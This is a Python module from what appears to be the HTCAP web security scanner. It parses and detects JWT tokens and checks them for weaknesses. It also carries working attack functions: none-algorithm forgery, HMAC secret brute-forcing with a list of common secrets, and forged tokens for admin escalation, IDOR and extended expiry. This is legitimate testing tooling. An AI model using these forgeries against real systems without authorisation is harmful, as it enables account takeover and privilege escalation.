# -*- coding: utf-8 -*-

"""
HTCAP - JWT Authentication Handler
Provides JWT token parsing, validation, and manipulation for security testing.

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
"""

import base64
import json
import hmac
import hashlib
import time
from typing import Dict, Any, Optional, List, Tuple
from dataclasses import dataclass
from enum import Enum


class JWTAlgorithm(Enum):
    """Supported JWT algorithms."""
    NONE = "none"
    HS256 = "HS256"
    HS384 = "HS384"
    HS512 = "HS512"
    RS256 = "RS256"
    RS384 = "RS384"
    RS512 = "RS512"
    ES256 = "ES256"
    ES384 = "ES384"
    ES512 = "ES512"


@dataclass
class JWTToken:
    """Represents a parsed JWT token."""
    raw: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: bytes
    algorithm: str
    is_valid: bool = False
    validation_error: Optional[str] = None


class JWTHandler:
    """
    Handler for JWT token operations in security testing.

    Provides functionality for:
    - Parsing and decoding JWT tokens
    - Detecting JWT vulnerabilities
    - Generating test tokens for fuzzing
    - Token manipulation for security testing
    """

    COMMON_SECRETS = [
        "secret",
        "password",
        "123456",
        "jwt_secret",
        "your-256-bit-secret",
        "your-secret-key",
        "changeme",
        "admin",
        "key",
        "private",
        "test",
    ]

    def __init__(self):
        self.tokens: List[JWTToken] = []

    @staticmethod
    def base64url_decode(data: str) -> bytes:
        """Decode base64url encoded data."""
        # Add padding if necessary
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def base64url_encode(data: bytes) -> str:
        """Encode data to base64url."""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

    def parse_token(self, token: str) -> Optional[JWTToken]:
        """
        Parse a JWT token string.

        Args:
            token: The JWT token string

        Returns:
            JWTToken object or None if parsing fails
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            header_b64, payload_b64, signature_b64 = parts

            header = json.loads(self.base64url_decode(header_b64))
            payload = json.loads(self.base64url_decode(payload_b64))
            signature = self.base64url_decode(signature_b64)

            algorithm = header.get('alg', 'unknown')

            jwt_token = JWTToken(
                raw=token,
                header=header,
                payload=payload,
                signature=signature,
                algorithm=algorithm
            )

            self.tokens.append(jwt_token)
            return jwt_token

        except Exception as e:
            return None

    def detect_in_request(self, request) -> List[Tuple[str, str, JWTToken]]:
        """
        Detect JWT tokens in a request.

        Args:
            request: HTTP request object

        Returns:
            List of tuples (location, key, token)
        """
        found_tokens = []

        # Check Authorization header
        if hasattr(request, 'extra_headers') and request.extra_headers:
            auth_header = request.extra_headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                token_str = auth_header[7:]
                token = self.parse_token(token_str)
                if token:
                    found_tokens.append(('header', 'Authorization', token))

        # Check cookies
        if hasattr(request, 'cookies'):
            for cookie in request.cookies:
                cookie_value = cookie.value if hasattr(cookie, 'value') else str(cookie)
                if self._looks_like_jwt(cookie_value):
                    token = self.parse_token(cookie_value)
                    if token:
                        found_tokens.append(('cookie', cookie.name if hasattr(cookie, 'name') else 'unknown', token))

        # Check URL parameters
        if '?' in request.url:
            query = request.url.split('?', 1)[1]
            for param in query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    if self._looks_like_jwt(value):
                        token = self.parse_token(value)
                        if token:
                            found_tokens.append(('url', key, token))

        # Check POST data
        if request.data:
            try:
                if isinstance(request.data, str):
                    data = json.loads(request.data)
                else:
                    data = request.data

                if isinstance(data, dict):
                    for key, value in data.items():
                        if isinstance(value, str) and self._looks_like_jwt(value):
                            token = self.parse_token(value)
                            if token:
                                found_tokens.append(('body', key, token))
            except (json.JSONDecodeError, TypeError):
                pass

        return found_tokens

    def _looks_like_jwt(self, value: str) -> bool:
        """Check if a string looks like a JWT token."""
        if not value or len(value) < 20:
            return False
        parts = value.split('.')
        if len(parts) != 3:
            return False
        # Check if first part looks like base64
        try:
            header = json.loads(self.base64url_decode(parts[0]))
            return 'alg' in header or 'typ' in header
        except:
            return False

    def check_vulnerabilities(self, token: JWTToken) -> List[Dict[str, str]]:
        """
        Check a JWT token for common vulnerabilities.

        Args:
            token: The JWT token to check

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []

        # Check for 'none' algorithm
        if token.algorithm.lower() == 'none':
            vulnerabilities.append({
                'type': 'jwt_none_algorithm',
                'severity': 'high',
                'description': "JWT uses 'none' algorithm which allows signature bypass"
            })

        # Check for weak algorithms
        weak_algorithms = ['HS256']  # HS256 can be bruteforced if secret is weak
        if token.algorithm in weak_algorithms:
            vulnerabilities.append({
                'type': 'jwt_weak_algorithm',
                'severity': 'medium',
                'description': f"JWT uses {token.algorithm} which may be vulnerable to brute force attacks if secret is weak"
            })

        # Check for expired token
        if 'exp' in token.payload:
            exp = token.payload['exp']
            if isinstance(exp, (int, float)) and exp < time.time():
                vulnerabilities.append({
                    'type': 'jwt_expired',
                    'severity': 'info',
                    'description': "JWT token has expired"
                })

        # Check for missing expiration
        if 'exp' not in token.payload:
            vulnerabilities.append({
                'type': 'jwt_no_expiration',
                'severity': 'low',
                'description': "JWT token has no expiration claim"
            })

        # Check for sensitive data in payload
        sensitive_keys = ['password', 'pwd', 'secret', 'credit_card', 'ssn', 'api_key']
        for key in token.payload:
            if any(s in key.lower() for s in sensitive_keys):
                vulnerabilities.append({
                    'type': 'jwt_sensitive_data',
                    'severity': 'medium',
                    'description': f"JWT payload contains potentially sensitive field: {key}"
                })

        # Check for algorithm confusion vulnerability
        if token.header.get('alg', '').startswith('RS') or token.header.get('alg', '').startswith('ES'):
            vulnerabilities.append({
                'type': 'jwt_algorithm_confusion_potential',
                'severity': 'low',
                'description': "JWT uses asymmetric algorithm - test for algorithm confusion attack (RS256 to HS256)"
            })

        return vulnerabilities

    def create_none_algorithm_token(self, token: JWTToken) -> str:
        """
        Create a token with 'none' algorithm for testing.

        Args:
            token: Original token

        Returns:
            Modified token string with 'none' algorithm
        """
        new_header = token.header.copy()
        new_header['alg'] = 'none'

        header_b64 = self.base64url_encode(json.dumps(new_header).encode())
        payload_b64 = self.base64url_encode(json.dumps(token.payload).encode())

        return f"{header_b64}.{payload_b64}."

    def create_modified_payload_token(self, token: JWTToken,
                                       modifications: Dict[str, Any],
                                       secret: str = None) -> Optional[str]:
        """
        Create a token with modified payload.

        Args:
            token: Original token
            modifications: Dictionary of payload modifications
            secret: Secret key for signing (if known)

        Returns:
            Modified token string or None
        """
        new_payload = token.payload.copy()
        new_payload.update(modifications)

        header_b64 = self.base64url_encode(json.dumps(token.header).encode())
        payload_b64 = self.base64url_encode(json.dumps(new_payload).encode())

        if secret and token.algorithm.startswith('HS'):
            # Sign with known secret
            message = f"{header_b64}.{payload_b64}"

            if token.algorithm == 'HS256':
                signature = hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha256
                ).digest()
            elif token.algorithm == 'HS384':
                signature = hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha384
                ).digest()
            elif token.algorithm == 'HS512':
                signature = hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha512
                ).digest()
            else:
                return None

            signature_b64 = self.base64url_encode(signature)
            return f"{header_b64}.{payload_b64}.{signature_b64}"

        # Return unsigned token (for none algorithm testing)
        return f"{header_b64}.{payload_b64}."

    def bruteforce_secret(self, token: JWTToken,
                          wordlist: List[str] = None) -> Optional[str]:
        """
        Attempt to bruteforce the JWT secret.

        Args:
            token: The JWT token
            wordlist: List of secrets to try

        Returns:
            Found secret or None
        """
        if not token.algorithm.startswith('HS'):
            return None

        secrets_to_try = wordlist or self.COMMON_SECRETS

        parts = token.raw.split('.')
        message = f"{parts[0]}.{parts[1]}".encode()

        for secret in secrets_to_try:
            if token.algorithm == 'HS256':
                test_sig = hmac.new(
                    secret.encode(),
                    message,
                    hashlib.sha256
                ).digest()
            elif token.algorithm == 'HS384':
                test_sig = hmac.new(
                    secret.encode(),
                    message,
                    hashlib.sha384
                ).digest()
            elif token.algorithm == 'HS512':
                test_sig = hmac.new(
                    secret.encode(),
                    message,
                    hashlib.sha512
                ).digest()
            else:
                continue

            if test_sig == token.signature:
                return secret

        return None

    def generate_fuzzing_tokens(self, token: JWTToken) -> List[Tuple[str, str]]:
        """
        Generate various modified tokens for fuzzing.

        Args:
            token: Original token

        Returns:
            List of (description, token_string) tuples
        """
        fuzz_tokens = []

        # None algorithm bypass
        none_token = self.create_none_algorithm_token(token)
        fuzz_tokens.append(("None algorithm bypass", none_token))

        # Empty signature
        parts = token.raw.split('.')
        fuzz_tokens.append(("Empty signature", f"{parts[0]}.{parts[1]}."))

        # Modified claims
        if 'role' in token.payload:
            admin_token = self.create_modified_payload_token(
                token, {'role': 'admin'}
            )
            if admin_token:
                fuzz_tokens.append(("Role escalation (admin)", admin_token))

        if 'admin' in token.payload:
            admin_token = self.create_modified_payload_token(
                token, {'admin': True}
            )
            if admin_token:
                fuzz_tokens.append(("Admin flag set to true", admin_token))

        if 'user_id' in token.payload or 'sub' in token.payload:
            key = 'user_id' if 'user_id' in token.payload else 'sub'
            idor_token = self.create_modified_payload_token(
                token, {key: '1'}
            )
            if idor_token:
                fuzz_tokens.append(("IDOR - user_id/sub set to 1", idor_token))

        # Expired claim manipulation
        future_exp = int(time.time()) + 86400 * 365  # 1 year from now
        exp_token = self.create_modified_payload_token(
            token, {'exp': future_exp}
        )
        if exp_token:
            fuzz_tokens.append(("Extended expiration", exp_token))

        return fuzz_tokens
